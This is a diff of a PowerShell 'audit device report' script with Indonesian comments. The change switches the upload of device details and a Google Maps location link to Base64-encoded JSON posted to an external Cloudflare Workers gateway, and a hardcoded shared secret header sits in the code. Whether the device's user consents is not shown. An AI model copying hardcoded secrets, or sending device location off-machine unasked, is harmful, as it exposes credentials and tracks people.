@@ -348,16 +348,25 @@ $Message = "📍 *AUDIT DEVICE REPORT*`n" +
            "━━━━━━━━━━━━━━━━━━`n" +
            "🔗 [GMAPS - Device Location]($MapsLink)"
 
-# PROSES FIX ENCODING: Paksa konversi internal dari encoding Windows default ke UTF-8 murni
-$ansiBytes = [System.Text.Encoding]::Default.GetBytes($Message)
-$utf8Bytes = [System.Text.Encoding]::Convert([System.Text.Encoding]::Default, [System.Text.Encoding]::UTF8, $ansiBytes)
+# 2. Konversi string menjadi Base64 murni (Aman dari segala distorsi encoding)
+$utf8Bytes   = [System.Text.Encoding]::UTF8.GetBytes($Message)
+$base64Text  = [Convert]::ToBase64String($utf8Bytes)
 
-# Kirim ke Cloudflare Gateway menggunakan Invoke-WebRequest seperti biasa
+# 3. Bungkus ke dalam format JSON payload
+$bodyJson = @{
+    data = $base64Text
+} | ConvertTo-Json -Compress
+
+# 4. Kirim ke Cloudflare Gateway
 $urlGateway = "https://win-audit-gateway.addohika.workers.dev"
-$headers = @{ "X-Audit-Signature" = "WinAuditS3cretPassw0rd2026" }
+$headers = @{
+    "X-Audit-Signature" = "WinAuditS3cretPassw0rd2026"
+}
 
 try {
-    Invoke-WebRequest -Uri $urlGateway -Method Post -Headers $headers -Body $utf8Bytes -ContentType "application/octet-stream" -ErrorAction Stop | Out-Null
+    # Kirim sebagai JSON murni
+    Invoke-RestMethod -Uri $urlGateway -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json; charset=utf-8" -ErrorAction Stop | Out-Null
+    Write-Host "Laporan terkirim dalam format Base64!" -ForegroundColor Green
 } catch {
     Write-Warning "Gagal mengirim laporan: $_"
 }
